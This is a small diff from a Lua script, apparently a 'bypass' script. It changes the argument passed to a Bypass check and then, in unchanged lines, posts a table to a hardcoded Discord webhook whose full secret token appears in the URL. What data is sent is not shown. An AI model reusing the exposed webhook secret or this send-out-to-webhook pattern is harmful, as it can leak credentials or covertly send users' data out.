@@ -635,7 +635,7 @@ local test = {
 }
 
 
-if tostring(Bypass(getDiscordID())) then
+if tostring(Bypass(bypass)) then
     main()
     sendWebhook("https://discord.com/api/webhooks/1389312568904122409/mK0uHuMzfWlAk2U52AP05W04CSERWhLlGjNuex2f-2M2ViWIfKCdhLzyFmsuVEwsJKwt", test)
 else
